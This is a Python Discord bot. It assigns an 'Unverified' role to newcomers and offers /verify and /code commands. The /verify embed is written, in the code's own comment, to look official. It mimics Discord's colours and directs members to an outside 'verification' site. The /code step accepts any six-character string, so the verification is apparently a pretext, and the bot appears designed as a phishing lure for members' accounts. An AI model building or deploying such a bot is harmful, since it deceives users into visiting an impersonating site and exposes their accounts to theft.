import discord
from discord.ext import commands

# Initialize the bot with application commands (slash commands)
intents = discord.Intents.default()
intents.members = True  # Enable access to member events (e.g., on_member_join)
intents.message_content = True  # Enable access to message content
bot = commands.Bot(command_prefix="/", intents=intents)

# Allowed channel ID
ALLOWED_CHANNEL_ID = 1335436446793732198

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    try:
        synced = await bot.tree.sync()  # Sync slash commands
        print(f"Synced {len(synced)} slash command(s)")
    except Exception as e:
        print(f"Failed to sync slash commands: {e}")

# Event: Assign "Unverified" role when a new member joins
@bot.event
async def on_member_join(member):
    # Find the "Unverified" role in the server
    unverified_role = discord.utils.get(member.guild.roles, name="Unverified")
    
    if unverified_role:
        try:
            # Assign the "Unverified" role to the new member
            await member.add_roles(unverified_role)
            print(f"Assigned 'Unverified' role to {member.name}#{member.discriminator}")
        except Exception as e:
            print(f"Failed to assign 'Unverified' role to {member.name}#{member.discriminator}: {e}")
    else:
        print("The 'Unverified' role does not exist. Please create it in the server.")

# Event: Delete any regular chat messages in the allowed channel
@bot.event
async def on_message(message):
    # Check if the message is in the allowed channel
    if message.channel.id == ALLOWED_CHANNEL_ID:
        # Delete any non-bot messages
        if not message.author.bot:
            await message.delete()

    # Process commands (important for slash commands to work)
    await bot.process_commands(message)

# Slash command: /verify
@bot.tree.command(name="verify", description="Start the verification process.")
async def verify(interaction: discord.Interaction):
    # Ensure the command is used in the allowed channel
    if interaction.channel_id != ALLOWED_CHANNEL_ID:
        await interaction.response.send_message(
            "This command can only be used in the designated verification channel.",
            ephemeral=True
        )
        return

    # Official-looking embed for verification instructions
    embed = discord.Embed(
        title="Verification Required",
        description=(
            "To gain access to the server, you must verify your identity.\n\n"
            "Please visit the official verification site:\n"
            "**[Click here to verify](https://discord-verify.vercel.app)**\n\n"
            "Once you have generated your code, use `/code <code>` in this server to complete the process."
        ),
        color=0x5865F2  # Discord's blurple color
    )
    embed.set_footer(text="This is an official server bot. Do not share your code with anyone.")

    # Send the embed as an ephemeral message
    await interaction.response.send_message(embed=embed, ephemeral=True)

# Slash command: /code
@bot.tree.command(name="code", description="Submit your verification code.")
async def code(interaction: discord.Interaction, submitted_code: str):
    # Ensure the command is used in the allowed channel
    if interaction.channel_id != ALLOWED_CHANNEL_ID:
        await interaction.response.send_message(
            "This command can only be used in the designated verification channel.",
            ephemeral=True
        )
        return

    # Check if the submitted code is exactly 6 characters long
    if len(submitted_code) == 6:
        # Assign the "Verified" role
        verified_role = discord.utils.get(interaction.guild.roles, name="Verified")
        unverified_role = discord.utils.get(interaction.guild.roles, name="Unverified")

        if verified_role:
            await interaction.user.add_roles(verified_role)
            if unverified_role:
                await interaction.user.remove_roles(unverified_role)  # Remove "Unverified" role
            # Success embed
            success_embed = discord.Embed(
                title="Verification Successful",
                description="You have been successfully verified. Welcome to the server!",
                color=0x57F287  # Green color for success
            )
            await interaction.response.send_message(embed=success_embed, ephemeral=True)
        else:
            # Error embed if the "Verified" role doesn't exist
            error_embed = discord.Embed(
                title="Verification Failed",
                description="The 'Verified' role does not exist. Please contact an admin.",
                color=0xED4245  # Red color for errors
            )
            await interaction.response.send_message(embed=error_embed, ephemeral=True)
    else:
        # Error embed for invalid code
        error_embed = discord.Embed(
            title="Invalid Code",
            description="Please enter a valid 6-character code.",
            color=0xED4245  # Red color for errors
        )
        await interaction.response.send_message(embed=error_embed, ephemeral=True)

# Run the bot
bot.run('bot_token')  # Replace with your actual bot token
